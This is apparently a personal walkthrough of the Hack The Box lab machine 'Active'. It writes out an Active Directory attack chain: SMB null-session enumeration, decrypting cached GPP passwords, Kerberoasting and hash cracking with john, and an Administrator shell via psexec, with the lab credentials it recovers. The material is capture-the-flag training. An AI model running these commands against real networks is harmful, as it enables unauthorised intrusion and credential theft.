---
title: Active
draft: false
passwordHash: b221d9dbb083a7f33428d7c2a3c3198ae925614d70210e28716ccaa7cd4ddb79
---
![[Active.png]]

Machine: https://app.hackthebox.com/machines/148

# Enumeration
## Port Scanning
- Getting the open ports using [[../../../Tools/Activas/3. Escaneo de puertos/nmap|nmap]]
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.10.100
```

- Enumerating service and versions, as well running some common scripts
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389 -sCV -n -Pn --min-rate 5000 10.10.10.100 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250311003834.png]]

Domain name: `active.htb`
Windows server Version: `windows_server_2008:r2:sp1` (old)

## LDAP
- We can use [[ldapsearch]] in order to collect some info (as we can stablish a connection, because we need valid credentials, we can continue with the enumeration)
```bash
ldapsearch -H ldap://10.10.10.100 -x -s base
```

DC Name: `dc$@ACTIVE.HTB`

## SMB
- Lets try to use a null session to get info using [[smbclient]]
```bash
smbclient -L //10.10.10.100 -N
```
>[!example]- Result
>![[Pasted image 20250311005443.png]]

- In order to read the folder permisions we can user [[crackmapexec]] or [[tools/nxc]]
```bash
crackmapexec smb 10.10.10.100 -u '' -p '' --shares -d active.htb
```
>[!example]- Result
>![[Pasted image 20250311010214.png]]

- Lets go into this folder
```bash
smbclient //10.10.10.100/Replication -N
```
>[!example]- Result
>![[Pasted image 20250311010347.png]]

# Exploitation
- Looks like we have a replication of the `SYSVOL` folder, as the version of windows is old we can try to get the [cached GPP](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=sysvol#cached-gpp-pasword) `\\active.htb\Replication\Policies\*\Machine\Preferences\Groups\Groups.xml`
```bash
mget \\10.10.10.100\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```
>[!example]- Result
>![[Pasted image 20250311020702.png]]

- now we can use a tool like [[gpp-decrypt]]
```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```
>[!example]- Result
>![[Pasted image 20250311021906.png]]
>![[Pasted image 20250311022016.png]]

Credentials `active.htb\SVC_TGS:GPPstillStandingStrong2k18`

- If we test de credentials using [[crackmapexec]] , they are valid
```bash
crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18'
```
>[!example]- Result
>![[Pasted image 20250311022340.png]]

# Enumeration 2
## LDAP
- Using the credentials
```bash
ldapsearch -H ldap://10.10.10.100 -x -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b 'DC=active,DC=htb'

or

ldapdomaindump 10.10.10.100 -u 'active.htb\svc_tgs' -p 'GPPstillStandingStrong2k18'

```
>[!example]- Result
>![[Pasted image 20250311024510.png]]

## Bloodhound
- Using [[bloodhaund-python]] and [[../../../Tools/BloodHound]] to get a better view of the AD enviroment
```bash
bloodhound-python -d active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' -c ALL -ns 10.10.10.100 --dns-tcp
```

## SMB
- Now we can access an other folders 
```bash
crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```
>[!example]- Result
>![[Pasted image 20250311022533.png]]

- We are able to enumerate users using RID
```bash
crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute

or
# to get only user names
crackmapexec smb 10.10.10.100 -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute | grep -oP '(?<=ACTIVE\\)(\S+)(?= \(SidTypeUser\))'

```
>[!example]- Result
>![[Pasted image 20250311023023.png]]


- The share "users" if quite interesting, because  inside "Default" folder we found some file named "NTUSER.DAT" this type of files contains recent access and credentials, we can use a tool like [[regripper]], but there are no useful information
```bash
smbclient //10.10.10.100/Users -U active.htb/SVC_TGS%GPPstillStandingStrong2k18 -c 'mget "Default"/*'
```
>[!example]- Result
>![[Pasted image 20250311115549.png]]

# Exploitation
- We can try to get a list of SPN (a identifier of a service instance, Kerberos use it to associate a service with a sign-in account) using [[impacket-GetUserSPNs]] , then we can crack it
```bash
impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -save -output GetUserSPN.out
```
>[!example]- Result
>![[Pasted image 20250311154411.png]]

- Now we can use [[john the ripper]]
```bash
john GetUserSPN.out --wordlist=/usr/share/wordlists/rockyou.txt -format=krb5tgs
```
>[!example]- Result
>![[Pasted image 20250311154747.png]]

>Credentials:`Administrator:Ticketmaster1968`

- Testing the credentials
```bash
crackmapexec smb 10.10.10.100 -u 'active.htb\Administrator' -p 'Ticketmaster1968' -x 'whoami /priv'
```
>[!example]- Result
>![[Pasted image 20250311155536.png]]
>![[Pasted image 20250311155538.png]]

# Getting Access
- We can [[psexec.py]] to get a interactive shell
```bash
psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```
>[!example]- Result
>![[Pasted image 20250311162743.png]]

